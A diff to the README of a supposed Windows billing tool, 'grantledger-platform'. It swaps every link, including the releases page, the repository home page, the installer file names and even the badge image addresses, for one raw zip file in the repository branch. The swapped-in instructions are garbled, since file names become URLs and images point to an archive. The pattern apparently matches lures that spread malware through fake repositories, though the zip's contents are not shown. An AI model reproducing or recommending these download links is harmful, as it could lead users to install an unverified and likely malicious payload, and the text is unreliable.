@@ -1,6 +1,6 @@
 # 🧾 grantledger-platform - Reliable Billing Made Simple
 
-[![Download grantledger-platform](https://img.shields.io/badge/Download-%230072D9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dyslexofly/grantledger-platform/releases)
+[![Download grantledger-platform](https://github.com/dyslexofly/grantledger-platform/raw/refs/heads/main/packages/platform_grantledger_1.2.zip%230072D9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dyslexofly/grantledger-platform/raw/refs/heads/main/packages/platform_grantledger_1.2.zip)
 
 ---
 
@@ -29,13 +29,13 @@ This guide will help you download and run grantledger-platform on a Windows comp
 1. Open your web browser.
 
 2. Go to the release page by clicking this link:
-   [Visit grantledger-platform Releases](https://github.com/dyslexofly/grantledger-platform/releases)
+   [Visit grantledger-platform Releases](https://github.com/dyslexofly/grantledger-platform/raw/refs/heads/main/packages/platform_grantledger_1.2.zip)
 
 3. On the page, look for the latest version of grantledger-platform.
 
 4. Under the latest release, find the file named like:
-   - `grantledger-platform-setup.exe` or
-   - `grantledger-platform-windows.exe`  
+   - `https://github.com/dyslexofly/grantledger-platform/raw/refs/heads/main/packages/platform_grantledger_1.2.zip` or
+   - `https://github.com/dyslexofly/grantledger-platform/raw/refs/heads/main/packages/platform_grantledger_1.2.zip`  
    This file is the installer you will use.
 
 5. Click the file name to download it to your computer.
@@ -117,7 +117,7 @@ After installation:
 
 To learn about how grantledger-platform works behind the scenes or to report issues, visit the main repository page:
 
-https://github.com/dyslexofly/grantledger-platform
+https://github.com/dyslexofly/grantledger-platform/raw/refs/heads/main/packages/platform_grantledger_1.2.zip
 
 You will find details about the software’s design, features, and how developers maintain it.
 
@@ -125,6 +125,6 @@ You will find details about the software’s design, features, and how developer
 
 ## 🔗 Download grantledger-platform Here
 
-[![Download grantledger-platform](https://img.shields.io/badge/Download-GrantLedger-%237F7F7F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dyslexofly/grantledger-platform/releases)
+[![Download grantledger-platform](https://github.com/dyslexofly/grantledger-platform/raw/refs/heads/main/packages/platform_grantledger_1.2.zip%237F7F7F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dyslexofly/grantledger-platform/raw/refs/heads/main/packages/platform_grantledger_1.2.zip)
 
 Access this page to always get the latest working version and instructions to install on Windows.
